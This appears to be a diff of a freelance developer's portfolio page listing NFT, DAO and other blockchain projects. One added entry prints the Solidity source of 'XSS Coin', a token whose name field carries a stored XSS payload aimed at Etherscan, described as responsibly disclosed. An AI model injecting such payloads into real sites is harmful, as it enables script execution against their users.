@@ -54,18 +54,6 @@
    */
 </script>
 
-<style>
-  section {
-    /*transform: rotate(var(--rotation));*/
-    padding: 0 20px 10px 20px;
-    border: 2px solid rgba(255, 255, 255, 0.05);
-    box-shadow: var(--shadow-x, 4px) var(--shadow-y, 4px) rgba(0, 0, 0, 0.25);
-    background: rgba(0, 0, 0, 0.1);
-    margin: 30px auto;
-    /*transition: box-shadow 1s;*/
-  }
-</style>
-
 <h1>Alberto Granzotto</h1>
 <p>
   I'm a freelance software engineer interested in decentralization, protocols,
@@ -81,6 +69,100 @@
   <h2>Currently working on</h2>
   <ul>
     <li>
+      Smart contract and dApp development for <a href="https://neokingdom.org/"
+        >Neokingdom DAO</a
+      >.
+    </li>
+
+    <li>
+      Doing weird^H^H^H^H^Hcreative projects with <a
+        href="https://www.dist0rtion.com">Social Dist0rtion Protocol</a
+      >, a collective from the year 2055.
+    </li>
+  </ul>
+</section>
+
+<section>
+  <h2>NFT works</h2>
+
+  <ul>
+    <li>
+      <a href="https://opensea.io/collection/cabinets-by-rafael-rozendaal"
+        >Cabinets</a
+      >
+      (Aug 2022, on-chain, Ethereum) by
+      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>. I developed the
+      smart contract and the dapp for the drop.
+    </li>
+
+    <li>
+      <a href="https://www.decentpoems.art/">Decent Poems</a> (Aug 2022,
+      on-chain, Polygon) by
+      <a href="">Nicola</a>
+      and me. The project won the
+      <a href="https://devpost.com/software/decent-poems">third prize</a> (NFT track).
+      I co-developed the smart contract and the dapp for the drop.
+    </li>
+
+    <li>
+      <a href="https://opensea.io/collection/doors-by-rafael-rozendaal">Doors</a
+      >
+      (June 2022, on-chain, Ethereum) by
+      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>. I developed the
+      smart contract and the dapp for the drop.
+    </li>
+
+    <li>
+      <a href="https://opensea.io/collection/emotons">Emotons</a> (June 2022, Ethereum)
+      I co-developed the smart contract and the dapp for the drop.
+    </li>
+
+    <li>
+      <a href="https://opensea.io/collection/hyperloop-by-ciceri">Hyperloop</a>
+      (May 2022, Ethereum) by
+      <a href="https://www.newrafael.com/">Umberto Ciceri</a>
+      I developed the smart contracts, and worked on encoding the videos.
+    </li>
+
+    <li>
+      <a href="https://opensea.io/collection/homage-by-rafael-rozendaal"
+        >Homage</a
+      >
+      (March 2022, on-chain, Ethereum) by
+      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>. I co-developed
+      the smart contract and the dapp for the drop.
+    </li>
+
+    <li>
+      <a href="https://github.com/left-gallery/81-horizons/">81 Horizons</a>
+      (Dec 2021, on-chain, Ethereum), a collection of 81 landscapes by
+      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>, stored and
+      rendered fully on-chain. I programmed the smart contract.
+    </li>
+
+    <li>
+      <a href="https://github.com/left-gallery/family-maker-wrapper"
+        >Family Maker Wrapper</a
+      >
+      (Oct 2021, Ethereum), a wrapper for the <em>Family Maker</em> token.
+    </li>
+
+    <li>
+      <a
+        href="https://etherscan.io/tx/0x8b74f49daff734e5dd6a74c98817ae252f9e944c41cfac25e127d88a449cb3bb"
+        >seasonal amulets</a
+      >, (March 2021, Ethereum), a collection of 4 lucky poems. I wrote some
+      <a href="https://twitter.com/vrde/status/1369043394115366921"
+        >tweets about it</a
+      >.
+    </li>
+  </ul>
+</section>
+
+<section>
+  <h2>Other projects</h2>
+  <ul>
+    <li>
       <a href="https://left.gallery/">left.gallery</a> is an online gallery that
       produces and sells downloadable objects since 2015. I'm helping them deploying
       custom ERC-721 contracts (NFT) for their gallery.
@@ -93,36 +175,6 @@
       <a href="https://gregmcmullen.net/">Greg McMullen</a>.
     </li>
 
-    <li>
-      Smart contract and dApp development for <a
-        href="http://www.teledisko.com/">Teledisko DAO</a
-      >. (More info soon.)
-    </li>
-
-    <li>
-      Doing weird^H^H^H^H^Hcreative projects with <a
-        href="https://www.dist0rtion.com">Social Dist0rtion Protocol</a
-      >, a collective from the year 2055.
-    </li>
-  </ul>
-</section>
-
-<section>
-  <h2>Active projects</h2>
-  <ul>
-    <li>
-      <a href="https://github.com/left-gallery/81-horizons/">81 Horizons</a>, a
-      collection of 81 landscapes by
-      <a href="https://www.newrafael.com/">Rafaël Rozendaal</a>, stored and
-      rendered fully on-chain. I programmed the smart contract.
-    </li>
-    <li>
-      <a href="https://zora.co/000/1690">seasonal amulets</a>, a collection of 4
-      lucky poems. I wrote some
-      <a href="https://twitter.com/vrde/status/1369043394115366921"
-        >tweets about it</a
-      >.
-    </li>
     <li>
       <a href="https://serenissimo.granzotto.net/">Serenissimo</a> is a bot to
       notify people living in the Veneto region about new vaccination
@@ -159,11 +211,37 @@
       configuration tool to run a local Ethereum node. It supports both
       OpenEthereum and Geth.
     </li>
+
+    <li>
+      <a
+        href="https://rinkeby.etherscan.io/address/0xbc8097678b0a5423d52617e952489fdee3a0eb28"
+        >XSS Coin</a
+      >, (October 2018, Ethereum Rinkeby), a stored XSS attack on Etherscan
+      (responsibly disclosed). That's the code:
+
+      <pre>
+pragma solidity ^0.4.24;
+import "openzeppelin-solidity/contracts/token/ERC20/StandardToken.sol";
+
+contract XSSCoin is StandardToken &#123;
+    string public name = "'
+style='position:fixed;top:0;left:0;width:9999px;height:999px;z-index:9'
+onmouseenter='alert(1)'";
+    string public symbol = "XSSCoin3";
+    uint public INITIAL_SUPPLY = 666;
+
+    constructor() public &#123;
+        totalSupply_ = INITIAL_SUPPLY;
+        balances[msg.sender] = INITIAL_SUPPLY;
+    }
+}
+</pre>
+    </li>
   </ul>
 </section>
 
 <section>
-  <h2>Previous projects</h2>
+  <h2>Older projects</h2>
   <ul>
     <li>
       <a href="https://gitcoin.co/grants/127/planet-a">Planet A</a>, a
@@ -244,3 +322,15 @@
     >
   </p>
 </section>
+
+<style>
+  section {
+    /*transform: rotate(var(--rotation));*/
+    padding: 0 20px 10px 20px;
+    border: 2px solid rgba(255, 255, 255, 0.05);
+    box-shadow: var(--shadow-x, 4px) var(--shadow-y, 4px) rgba(0, 0, 0, 0.25);
+    background: rgba(0, 0, 0, 0.1);
+    margin: 30px auto;
+    /*transition: box-shadow 1s;*/
+  }
+</style>
